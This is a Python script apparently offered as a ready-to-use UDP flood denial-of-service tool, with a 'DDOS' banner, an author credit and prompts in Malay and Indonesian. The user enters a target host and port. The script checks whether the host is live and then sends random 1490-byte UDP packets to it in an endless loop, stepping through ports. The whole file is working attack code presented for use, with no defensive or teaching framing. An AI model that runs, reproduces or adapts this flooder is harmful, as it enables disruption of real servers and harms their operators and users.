# third update 
# Tool script-kiddies
# Tool by ind3nt_ 

import sys, socket, datetime, os
from time import sleep as dl

date = datetime.datetime.now()

# Couleurs
BRIGHT_VIOLET = "\033[95m"
RESET = "\033[0m"

clear = "clear" if os.name == "posix" else "cls"
os.system(clear)

banner = f"""{BRIGHT_VIOLET}
▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░       ░        ░ ░        ░  
 ░       ░                       
                    
                       ×UDP Flood Dos×
                     [Author | @ind3nt_]
            [Github | https://github.com/ipcscyber]
{RESET}"""

print(banner)

try:
    hostname = input("Masukkan hostname/Ip target: ")
    min_port = int(input("Masukkan port target: "))
except KeyboardInterrupt:
    sys.exit("You exit tool..")
except Exception:
    sys.exit("Ip Address or Port is invalid!")
print("Scan ip and port 5 second...")
ip = socket.gethostbyname(hostname)
try:
    socket.gethostbyaddr(ip)
    status = "Aktif"
except (socket.gaierror, socket.herror):
    status = "Tiada Sambungan"
port = min_port
dl(2)
os.system(clear)
print(banner)
print('[>==[Info Server]==<]');dl(0.2)
print('- Domain    : %s\n- Status    : %s\n- Address   : %s\n- Port      : %s'%(hostname,status,ip,"Any"))

if status != "Aktif":
    dl(0.5)
    sys.exit("\nServer seperti tidak hidup. Cuba lagi")
else:
    print(f'- Attack at : {date}')
    pass
dl(2);
print("Attack in 5 second...")
dl(5)

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
data = os.urandom(1490)
sent = 0
while True:
    try:
        sock.sendto(data, (ip,port))
        port = port + 1
        sent += 1
        print("Flooding %d packets through port %d!"%(sent,port))
        if port == 65535:
            port = min_port
    except KeyboardInterrupt:
        print('[Connection info]');dl(0.2)
        print('Domain    : %s\nAddress   : %s\nPort      : %s'%(hostname,ip,"Any"))
        sys.exit(f"You're exited tool...")
